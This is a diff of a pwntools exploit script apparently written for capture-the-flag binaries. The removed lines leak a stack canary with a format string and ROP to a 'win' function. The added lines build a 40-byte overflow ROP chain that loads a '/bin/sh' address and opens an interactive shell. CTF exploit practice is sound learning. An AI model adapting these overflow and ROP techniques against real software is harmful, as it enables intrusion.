@@ -4,12 +4,13 @@ from pwn import *
 # =========================================================
 #                          SETUP                         
 # =========================================================
-exe = './guess_it'
+exe = './not-allowed' # <-- change this
 elf = context.binary = ELF(exe, checksec=True)
 libc = '/usr/lib/libc.so.6'
 libc = ELF(libc, checksec=False)
 context.log_level = 'debug'
-host, port = 'chals.swampctf.com', 64236
+context.terminal = ["tmux", "splitw", "-h"]
+host, port = '', 1337 # <-- change this
 
 def initialize(argv=[]):
     if args.GDB:
@@ -21,7 +22,8 @@ def initialize(argv=[]):
 
 gdbscript = '''
 init-pwndbg
-break win
+break main
+break wish
 '''.format(**locals())
 
 # =========================================================
@@ -32,24 +34,23 @@ def exploit():
     io = initialize()
     rop = ROP(exe)
     
-    nop_ret = 0x040112f
-    # 31$p canary    
-    io.sendlineafter(b'>', b'Yes')
-    io.sendline(b'%31$p')
-
-    io.recvuntil(b'0x')
-    canary = int(io.recvline(), 16)
-    success('Canary %#x', canary)
-
-    offset = 8
-    payload = b'\x00' * 8
-    payload += p64(canary)
-    payload += p64(nop_ret)
-    payload += p64(nop_ret)
-    payload += p64(elf.sym['win'])
+    # call wish first to get binsh at addr: 0x40407d
+    binsh = 0x40407d
+    pop_rdi = 0x401156
+    
+    offset = 40
+    payload = flat({
+        offset: [
+            elf.sym['wish'],
+            pop_rdi,
+            binsh,
+            elf.sym['main']
+        ]
+    })
 
     io.sendline(payload)
-    io.sendline(b'No')
+    
+    io.sendline(b'\x15')
     io.interactive()
     
 if __name__ == '__main__':
